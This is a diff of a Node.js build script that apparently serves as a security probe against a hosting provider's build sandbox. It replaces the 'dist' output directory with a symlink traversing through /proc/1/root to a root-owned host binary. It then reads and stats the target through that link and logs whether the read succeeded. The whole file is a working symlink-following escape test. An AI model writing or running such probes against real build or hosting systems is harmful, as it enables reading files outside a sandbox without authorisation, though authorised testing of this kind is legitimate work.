@@ -1,24 +1,17 @@
 import fs from "node:fs";
 import path from "node:path";
 
-const marker = "HOSTINGER_NODE_HIDEPID_SYMLINK_GATE:r216";
+const marker = "HOSTINGER_NODE_OUTPUT_ROOT_FILE_SYMLINK_GATE:r217";
 const output = path.resolve("dist");
 fs.rmSync(output, { recursive: true, force: true });
-fs.mkdirSync(output, { recursive: true });
-fs.writeFileSync(path.join(output, "control.txt"), `${marker}:a13e769021044237\n`, { mode: 0o600 });
-
-function createLink(name, target) {
-  try {
-    fs.symlinkSync(target, path.join(output, name));
-    return { created: true, target, isSymlink: fs.lstatSync(path.join(output, name)).isSymbolicLink() };
-  } catch (error) {
-    return { created: false, target, errorCode: error.code ?? error.name };
-  }
+const linkTarget = "../../../../../../../proc/1/root/usr/sbin/proxyexec";
+let outputLink;
+try {
+  fs.symlinkSync(linkTarget, output);
+  outputLink = { created: true, target: linkTarget, isSymlink: fs.lstatSync(output).isSymbolicLink() };
+} catch (error) {
+  outputLink = { created: false, target: linkTarget, errorCode: error.code ?? error.name };
 }
-
-const safeLink = createLink("owned-link", "control.txt");
-const rootLink = createLink("root-owned-probe", "../../../../../../../../proc/1/root/usr/sbin/proxyexec");
-const missingLink = createLink("missing-probe", "../../../../../../../../proc/1/root/root/hostinger-h1-nonexistent-r216");
 
 let directRead;
 try {
@@ -30,19 +23,25 @@ try {
 
 let linkRead;
 try {
-  const body = fs.readFileSync(path.join(output, "root-owned-probe"));
+  const body = fs.readFileSync(output);
   linkRead = { readable: true, bytes: body.length };
 } catch (error) {
   linkRead = { readable: false, errorCode: error.code ?? error.name };
+}
+
+let outputStat;
+try {
+  const stat = fs.statSync(output);
+  outputStat = { available: true, isFile: stat.isFile(), isDirectory: stat.isDirectory(), bytes: stat.size };
+} catch (error) {
+  outputStat = { available: false, errorCode: error.code ?? error.name };
 }
 
 console.log(JSON.stringify({
   marker,
   directRead,
   linkRead,
-  safeLink,
-  rootLink,
-  missingLink,
-  outputEntries: fs.readdirSync(output).sort().slice(0, 64),
+  outputLink,
+  outputStat,
   outputRelativeToRepository: path.relative(process.cwd(), output),
 }));
